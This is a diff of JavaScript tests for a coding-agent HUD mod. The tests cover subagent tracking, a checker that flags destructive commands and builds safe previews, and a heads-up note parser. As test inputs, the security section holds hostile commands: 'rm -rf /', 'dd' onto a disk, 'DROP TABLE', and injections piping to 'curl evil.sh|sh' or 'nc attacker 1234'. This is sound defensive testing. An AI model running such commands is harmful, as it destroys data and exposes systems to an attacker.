@@ -16,6 +16,10 @@ import { paceOf, paceText, paceMark, FAST_RATIO } from '../hooks/hud-pace.js';
 import { record, logLines, tuneLines, signalsIn, snippet, commonWords, KEEP } from '../hooks/hud-log.js';
 import { buildSuggestPrompt, parseSuggestions, WANTED, MAX_LENGTH } from '../hooks/hud-suggest.js';
 import { readUsage, contextPercentOf, limitsOf, epochSecondsOf, asPercent, describeUsage } from '../hooks/hud-usage.js';
+import { spawned, shortName, addTokens, tokensOf, merge, visible, prune, shares,
+    elapsedText, tokenText, statusColor, LINGER_MS } from '../hooks/hud-agents.js';
+import { assess, firstPath, previewFor, countLines, describe, warningFor } from '../hooks/hud-blast.js';
+import { shouldCheck, buildHeadsPrompt, flatten, parseHeadsUp } from '../hooks/hud-heads.js';
 import { barText, barPieces, fit, layout, buildGroups, percentText, modelText, resetText, shortKind, tone, width } from '../hooks/hud-format.js';
 
 const OPTS = {
@@ -741,4 +745,366 @@ test('/hud raw says what it found, and what it made of it', async () => {
     expect(/read as: context 31%/.test(text)).toBe(true);
     expect(/no reset time/.test(text)).toBe(true);
     expect(/nothing usable/.test(describeUsage(null).join('\n'))).toBe(true);
+});
+
+// ============================================================ subagent monitor
+
+test('an agent is recorded once, however many times it is announced', async () => {
+    let agents = spawned([], { agentId: 'a1', subagent_type: 'general-purpose' });
+    agents = spawned(agents, { agentId: 'a1', subagent_type: 'general-purpose' });
+    expect(agents.length).toBe(1);
+    expect(agents[0].name).toBe('general');
+});
+
+test('an announcement with no id is ignored rather than stored as undefined', async () => {
+    expect(spawned([], {}).length).toBe(0);
+    expect(spawned([], null).length).toBe(0);
+});
+
+test('an agent name is shortened to fit a row', async () => {
+    expect(shortName({ subagent_type: 'code-reviewer' })).toBe('code');
+    expect(shortName({ type: 'Explore' })).toBe('explore');
+    expect(shortName({})).toBe('agent');
+    expect(shortName({ name: 'averyverylongagentname' }).length <= 9).toBe(true);
+});
+
+test('tokens land on the agent that spent them, and nowhere else', async () => {
+    let agents = spawned(spawned([], { agentId: 'a1' }), { agentId: 'a2' });
+    agents = addTokens(agents, 'a1', 500);
+    agents = addTokens(agents, 'a1', 250);
+    agents = addTokens(agents, 'a2', 100);
+    expect(agents.find((a) => a.id === 'a1').tokens).toBe(750);
+    expect(agents.find((a) => a.id === 'a2').tokens).toBe(100);
+});
+
+test('tokens for an agent nobody knows about change nothing', async () => {
+    const agents = spawned([], { agentId: 'a1' });
+    expect(addTokens(agents, 'ghost', 900)).toEqual(agents);
+    expect(addTokens(agents, '', 900)).toEqual(agents);
+    expect(addTokens(agents, 'a1', 0)).toEqual(agents);
+});
+
+test('a usage report is totalled however its fields are named', async () => {
+    expect(tokensOf({ input_tokens: 100, output_tokens: 50 })).toBe(150);
+    expect(tokensOf({ inputTokens: 100, cacheReadInputTokens: 20 })).toBe(120);
+    expect(tokensOf({})).toBe(0);
+    expect(tokensOf(null)).toBe(0);
+    expect(tokensOf({ input_tokens: 'lots' })).toBe(0);
+});
+
+test('the agent list is the authority on status', async () => {
+    let agents = spawned([], { agentId: 'a1' });
+    agents = merge(agents, [{ id: 'a1', status: 'completed' }]);
+    expect(agents[0].status).toBe('completed');
+    expect(agents[0].finishedAt !== null).toBe(true);
+});
+
+test('an agent only the list knows about is still shown', async () => {
+    // Missing one that is plainly running is worse than showing one the
+    // events did not catch.
+    const agents = merge([], [{ id: 'z9', status: 'running', subagent_type: 'explore' }]);
+    expect(agents.length).toBe(1);
+    expect(agents[0].name).toBe('explore');
+});
+
+test('a finished agent lingers, then goes', async () => {
+    const now = Date.now();
+    const agents = [{ id: 'a1', status: 'completed', finishedAt: now - 1000, startedAt: now - 9000, tokens: 1 }];
+    expect(visible(agents, now).length).toBe(1);
+    expect(visible(agents, now + LINGER_MS).length).toBe(0);
+    expect(prune(agents, now + LINGER_MS).length).toBe(0);
+});
+
+test('a running agent is never pruned, however long it runs', async () => {
+    const old = { id: 'a1', status: 'running', finishedAt: null, startedAt: 0, tokens: 0 };
+    expect(prune([old], Date.now()).length).toBe(1);
+});
+
+test('shares add up to the whole, and are zero before anything is spent', async () => {
+    const out = shares([{ tokens: 300 }, { tokens: 100 }]);
+    expect(Math.round(out[0] * 100)).toBe(75);
+    expect(Math.round(out[1] * 100)).toBe(25);
+    expect(shares([{ tokens: 0 }, { tokens: 0 }])).toEqual([0, 0]);
+    expect(shares([])).toEqual([]);
+});
+
+test('elapsed and token counts stay short enough for a row', async () => {
+    const now = Date.now();
+    expect(elapsedText(now - 18000, now)).toBe('18s');
+    expect(elapsedText(now - 125000, now)).toBe('2m5s');
+    expect(elapsedText(now - 3720000, now)).toBe('1h2m');
+    expect(tokenText(950)).toBe('950');
+    expect(tokenText(4100)).toBe('4.1k');
+    expect(tokenText(1200000)).toBe('1.2m');
+});
+
+test('status drives the colour, and failure is loud', async () => {
+    expect(statusColor('running')).toBe('green');
+    expect(statusColor('waiting')).toBe('yellow');
+    expect(statusColor('failed')).toBe('red');
+    expect(statusColor('killed')).toBe('red');
+    expect(statusColor('completed')).toBe(undefined);
+});
+
+// ================================================================ blast radius
+
+test('the destructive shapes are recognised', async () => {
+    expect(assess('rm -rf build').kind).toBe('rm');
+    expect(assess('rm -fr build').kind).toBe('rm');
+    expect(assess('git reset --hard').kind).toBe('git-reset');
+    expect(assess('git clean -fd').kind).toBe('git-clean');
+    expect(assess('git push --force origin main').kind).toBe('git-force-push');
+    expect(assess('git push -f').kind).toBe('git-force-push');
+    expect(assess('DROP TABLE users;').kind).toBe('sql-drop');
+    expect(assess('dd if=/dev/zero of=/dev/sda').kind).toBe('disk');
+});
+
+test('ordinary commands are left entirely alone', async () => {
+    const safe = ['ls -la', 'npm install', 'rm file.txt', 'git status',
+        'git push origin main', 'cat README.md', '', null];
+    for (const command of safe) {
+        expect(assess(command)).toBe(null);
+    }
+});
+
+test('force-with-lease is not a force push, and must not be treated as one', async () => {
+    // It is the safe form. Interrupting it would train you to ignore the box.
+    expect(assess('git push --force-with-lease')).toBe(null);
+    expect(assess('git push --force-with-lease origin main')).toBe(null);
+});
+
+test('a command that builds its own arguments is not guessed at', async () => {
+    // Measuring the wrong thing is worse than measuring nothing.
+    expect(assess('rm -rf $(cat list)')).toBe(null);
+    expect(assess('find . -name "*.o" | xargs rm -rf')).toBe(null);
+});
+
+test('a catastrophic target is marked as one', async () => {
+    expect(assess('rm -rf /').precious).toBe(true);
+    expect(assess('rm -rf ~').precious).toBe(true);
+    expect(assess('rm -rf .').precious).toBe(true);
+    expect(assess('rm -rf build').precious).toBe(false);
+    expect(/read it twice/i.test(warningFor(assess('rm -rf /')))).toBe(true);
+    expect(warningFor(assess('rm -rf build'))).toBe('');
+});
+
+test('a path with shell characters in it is not measured', async () => {
+    expect(firstPath('a;rm')).toBe(null);
+    expect(firstPath('*')).toBe(null);
+    expect(firstPath('-rf build')).toBe('build');
+});
+
+test('every preview is argv, with a fixed verb and no shell', async () => {
+    // This is the whole security property of the file.
+    const commands = ['rm -rf build', 'git reset --hard', 'git clean -fd', 'git push --force'];
+    for (const command of commands) {
+        const preview = previewFor(assess(command));
+        expect(Array.isArray(preview.argv)).toBe(true);
+        expect(['find', 'git'].indexOf(preview.argv[0]) >= 0).toBe(true);
+        for (const arg of preview.argv) {
+            expect(typeof arg).toBe('string');
+        }
+    }
+});
+
+test('a target with a space travels as one argument, not as shell text', async () => {
+    const preview = previewFor({ kind: 'rm', target: 'my dir', precious: false });
+    expect(preview.argv).toEqual(['find', 'my dir', '-type', 'f']);
+});
+
+test('the kinds with no safe measurement return no preview', async () => {
+    expect(previewFor({ kind: 'sql-drop' })).toBe(null);
+    expect(previewFor({ kind: 'disk' })).toBe(null);
+    expect(previewFor(null)).toBe(null);
+});
+
+test('counting is counting lines, and empty output is zero', async () => {
+    expect(countLines('a\nb\nc')).toBe(3);
+    expect(countLines('')).toBe(0);
+    expect(countLines(null)).toBe(0);
+});
+
+test('the question leads with the number', async () => {
+    const many = describe(assess('rm -rf build'), 1240);
+    expect(/1,240 files/.test(many)).toBe(true);
+    expect(/build/.test(many)).toBe(true);
+    const one = describe(assess('rm -rf build'), 1);
+    expect(one.indexOf('1 file ') >= 0).toBe(true);
+    expect(one.indexOf('1 files') >= 0).toBe(false);
+});
+
+test('an unmeasurable command still gets an honest sentence', async () => {
+    const text = describe(assess('rm -rf build'), null);
+    expect(/could not be measured/.test(text)).toBe(true);
+    expect(/null/.test(text)).toBe(false);
+});
+
+test('each kind says what it actually destroys', async () => {
+    expect(/uncommitted/.test(describe(assess('git reset --hard'), 4))).toBe(true);
+    expect(/untracked/.test(describe(assess('git clean -fd'), 7))).toBe(true);
+    expect(/overwrites the remote/.test(describe(assess('git push -f'), 2))).toBe(true);
+    expect(/no undo/i.test(describe(assess('DROP TABLE t;'), null))).toBe(true);
+});
+
+// =================================================================== heads up
+
+test('a small turn is not worth a check', async () => {
+    expect(shouldCheck({ on: true, sinceLast: 9, toolCalls: 1, answer: 'done' })).toBe(false);
+});
+
+test('a big turn is, but only after enough turns have passed', async () => {
+    expect(shouldCheck({ on: true, sinceLast: 1, toolCalls: 9, answer: 'x'.repeat(2000) })).toBe(false);
+    expect(shouldCheck({ on: true, sinceLast: 3, toolCalls: 9, answer: '' })).toBe(true);
+    expect(shouldCheck({ on: true, sinceLast: 3, toolCalls: 0, answer: 'x'.repeat(2000) })).toBe(true);
+});
+
+test('heads up off means off', async () => {
+    expect(shouldCheck({ on: false, sinceLast: 99, toolCalls: 99, answer: 'x'.repeat(9999) })).toBe(false);
+});
+
+test('the conversation is flattened whatever shape the blocks are', async () => {
+    const messages = [
+        { role: 'user', content: 'fix the parser' },
+        { role: 'assistant', content: [{ type: 'text', text: 'I changed parser.js' }, { type: 'tool_use' }] },
+        { role: 'system', content: 'ignored' },
+    ];
+    const text = flatten(messages);
+    expect(/Developer: fix the parser/.test(text)).toBe(true);
+    expect(/Assistant: I changed parser\.js/.test(text)).toBe(true);
+    expect(/ignored/.test(text)).toBe(false);
+});
+
+test('a short conversation is not worth sending', async () => {
+    expect(buildHeadsPrompt([{ role: 'user', content: 'hi' }])).toBe(null);
+    expect(buildHeadsPrompt([])).toBe(null);
+});
+
+test('the heads-up request asks for silence by default, and says so', async () => {
+    const ask = buildHeadsPrompt([{ role: 'assistant', content: 'x'.repeat(500) }]);
+    expect(/NONE/.test(ask)).toBe(true);
+    expect(ask.length < 3200).toBe(true);
+});
+
+test('NONE is silence, in any spelling', async () => {
+    for (const quiet of ['NONE', 'none', 'None.', 'NONE - nothing to flag']) {
+        expect(parseHeadsUp(quiet)).toBe(null);
+    }
+});
+
+test('a real note comes through, cleaned', async () => {
+    const note = parseHeadsUp('- "The retry test still asserts the old timeout."');
+    expect(note).toBe('The retry test still asserts the old timeout.');
+});
+
+test('anything that is not a short concrete note is dropped', async () => {
+    const bad = ['', '   ', 'Sure, here is one:', 'ok', 'Did you mean to change the timeout?',
+        'x'.repeat(400), 'I think that', 'As an assistant I would say the parser changed'];
+    for (const b of bad) {
+        expect(parseHeadsUp(b)).toBe(null);
+    }
+});
+
+test('an object reply is read as well as a string, for heads up', async () => {
+    const note = parseHeadsUp({ text: 'The migration drops a column the report still reads.' });
+    expect(note).toBe('The migration drops a column the report still reads.');
+});
+
+// ===================================== the preview cannot be turned into a weapon
+//
+// This is the only part of the mod that starts a process, so it is the only
+// part where a mistake is a security bug rather than a cosmetic one. Each
+// test below is an attack, not a feature.
+
+/** Every argv a command would produce, or null. */
+const argvFor = (command) => {
+    const found = assess(command);
+    if (!found) return null;
+    const preview = previewFor(found);
+    return preview ? preview.argv : null;
+};
+
+test('a target cannot turn find into a destructive command', async () => {
+    // `find -delete` deletes. If a target starting with a dash reached the
+    // argv, the preview would destroy the thing it was asked to measure.
+    const attacks = ['rm -rf -delete', 'rm -rf -exec rm {} ;', 'rm -rf --delete',
+        'rm -rf -newer /etc/passwd -delete'];
+    for (const attack of attacks) {
+        const argv = argvFor(attack);
+        if (!argv) continue;
+        expect(argv.indexOf('-delete') >= 0).toBe(false);
+        expect(argv.indexOf('-exec') >= 0).toBe(false);
+    }
+});
+
+test('no preview argv ever contains an action, only a test', async () => {
+    const acting = ['-delete', '-exec', '-execdir', '-ok', '-okdir', '-fls', '-fprint', '-fprintf'];
+    const commands = ['rm -rf build', 'rm -rf /', 'rm -rf a/b/c', 'git reset --hard',
+        'git clean -fd', 'git push --force'];
+    for (const command of commands) {
+        const argv = argvFor(command) || [];
+        for (const bad of acting) {
+            expect(argv.indexOf(bad) >= 0).toBe(false);
+        }
+    }
+});
+
+test('shell metacharacters never reach an argv', async () => {
+    const attacks = [
+        'rm -rf build;curl evil.sh|sh',
+        'rm -rf build && curl evil',
+        'rm -rf build|nc attacker 1234',
+        'rm -rf $(whoami)',
+        'rm -rf "a b"',
+        'rm -rf build>out',
+        'rm -rf *',
+        'rm -rf {a,b}',
+    ];
+    for (const attack of attacks) {
+        const argv = argvFor(attack);
+        if (argv === null) continue;
+        for (const arg of argv) {
+            expect(/[;&|<>$`(){}*?!\\'"]/.test(arg)).toBe(false);
+        }
+    }
+});
+
+test('the verb of a preview can never come from the command text', async () => {
+    const argv = argvFor('rm -rf curl');
+    expect(argv[0]).toBe('find');
+    expect(argv).toEqual(['find', 'curl', '-type', 'f']);
+});
+
+test('git previews take no argument from the command at all', async () => {
+    const commands = ['git reset --hard origin/evil', 'git clean -fd /etc',
+        'git push --force git@evil:repo main'];
+    for (const command of commands) {
+        const argv = argvFor(command);
+        expect(argv.every((a) => a.indexOf('evil') === -1)).toBe(true);
+    }
+});
+
+test('an absurd path cannot change the shape of the argv', async () => {
+    const attacks = ['rm -rf ' + 'a'.repeat(5000), 'rm -rf ./././././build'];
+    for (const attack of attacks) {
+        const argv = argvFor(attack);
+        if (!argv) continue;
+        expect(argv.length).toBe(4);
+        expect(argv[0]).toBe('find');
+        expect(typeof argv[1]).toBe('string');
+    }
+});
+
+test('firstPath refuses anything it cannot read plainly', async () => {
+    const bad = ['"a b"', "'a'", 'a;b', 'a|b', 'a&b', 'a>b', 'a<b', 'a*b', 'a?b',
+        'a(b)', 'a{b}', 'a!b', ''];
+    for (const text of bad) {
+        expect(firstPath(text)).toBe(null);
+    }
+    expect(firstPath('-rf -v build extra')).toBe('build');
+});
+
+test('an empty or absent target produces no preview at all', async () => {
+    expect(assess('rm -rf')).toBe(null);
+    expect(assess('rm -rf   ')).toBe(null);
+    expect(assess('rm -rf -v')).toBe(null);
 });
